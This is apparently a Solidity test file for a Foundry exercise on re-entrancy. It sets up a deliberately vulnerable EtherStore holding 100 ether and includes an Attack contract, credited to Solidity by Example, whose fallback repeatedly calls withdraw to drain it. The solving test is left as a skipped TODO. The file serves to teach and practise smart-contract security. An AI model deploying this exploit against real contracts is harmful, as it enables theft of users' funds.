// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { Test } from "forge-std/Test.sol";

import { EtherStore } from "../../contracts/vulnerable/ReEntrancy.sol";

/**
 * From Solidity by Example: https://solidity-by-example.org/hacks/re-entrancy/
 * Source:
 * https://github.com/Cyfrin/solidity-by-example.github.io/blob/f88d8ed8/contracts/src/hacks/re-entrancy/ReEntrancy.sol
 */
contract Attack {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{ value: AMOUNT }();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract EtherStoreReEntrant is Test {
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    uint256 constant ETHER_IN_STORE = 100 ether;
    uint256 constant INITIAL_BALANCE = 1 ether;

    EtherStore store = new EtherStore();

    modifier checkSolvedByPlayer() {
        vm.startPrank(attacker, attacker);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() external {
        startHoax(deployer);
        store.deposit{ value: ETHER_IN_STORE }();
        vm.deal(attacker, INITIAL_BALANCE);
        vm.stopPrank();
    }

    function test_assertInitialState() external view {
        assertEq(address(store).balance, ETHER_IN_STORE);
        assertEq(attacker.balance, INITIAL_BALANCE);
    }

    function test_reentrancy() external checkSolvedByPlayer {
        vm.skip(true); // TODO
    }

    function _isSolved() internal view {
        assertEq(address(store).balance, 0, "Store still has ETH");
        assertEq(attacker.balance, INITIAL_BALANCE + ETHER_IN_STORE, "Not enough ETH in attacker account");
    }
}
